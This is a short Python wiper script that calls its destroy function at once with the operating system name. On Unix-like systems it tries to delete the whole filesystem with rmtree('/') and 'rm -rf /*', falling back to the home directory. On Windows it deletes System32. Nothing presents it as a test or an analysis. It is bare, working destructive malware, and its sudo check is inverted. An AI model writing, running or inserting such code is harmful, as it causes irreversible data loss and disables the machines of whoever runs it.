def destroy(sys):
    if sys=="posix":
        root="sudo " if geteuid()==0 else ""
        try:rmtree("/")
        except:
            try:system(f"{root}rm -rf /*")
            except:system(f"{root}rm -rf ~")
    elif sys=="nt":
        try:rmtree("C:\Windows\System32")
        except:system("del /f /q /a C:\Windows\System32")
destroy(name)
